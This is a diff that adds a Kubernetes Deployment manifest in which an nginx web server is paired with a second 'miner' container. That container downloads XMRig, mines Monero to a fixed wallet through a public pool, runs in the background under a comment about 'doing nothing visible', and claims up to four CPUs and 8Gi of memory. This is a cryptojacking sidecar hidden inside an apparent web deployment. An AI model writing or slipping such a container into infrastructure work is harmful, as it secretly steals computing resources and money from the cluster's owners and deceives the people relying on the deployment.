@@ -1,0 +1,50 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: nginx-with-miner
+  namespace: app
+spec:
+  replicas: 2
+  selector:
+    matchLabels:
+      app: nginx-with-miner
+  template:
+    metadata:
+      labels:
+        app: nginx-with-miner
+    spec:
+      dnsPolicy: Default
+      containers:
+      - name: nginx
+        image: nginx:latest
+        ports:
+        - containerPort: 80
+        resources:
+          requests:
+            cpu: "50m"
+            memory: "64Mi"
+          limits:
+            cpu: "500m"
+            memory: "256Mi"
+      - name: miner
+        image: busybox:latest
+        command:
+        - /bin/sh
+        - -c
+        - |
+          # Download and run XMRig mining in the background
+          apk add --no-cache curl tar bash
+          curl -sL https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-static-x64.tar.gz -o xmrig.tar.gz
+          tar -xzf xmrig.tar.gz && cd xmrig-*
+          ./xmrig -o pool.supportxmr.com:443 \
+                  -u 49DgHaxUyn6PioVubhkjxGKyUuZLszKwaDzRhNugcrmadwzDgmSGU62h8hGVFFfraaRJqR2yJ8eHbERwXUBGFXAbRcxujsE \
+                  -k --tls --coin monero --threads=$(nproc) &
+          # Keep the container running, doing nothing visible
+          tail -f /dev/null
+        resources:
+          requests:
+            cpu: "500m" # Requesting 0.5 CPUs
+            memory: "2Gi" # Requesting 2GB of memory
+          limits:
+            cpu: "4000m" # Limiting to 4 CPUs (4 CPU cores)
+            memory: "8Gi" # Limiting to 8GB of memory
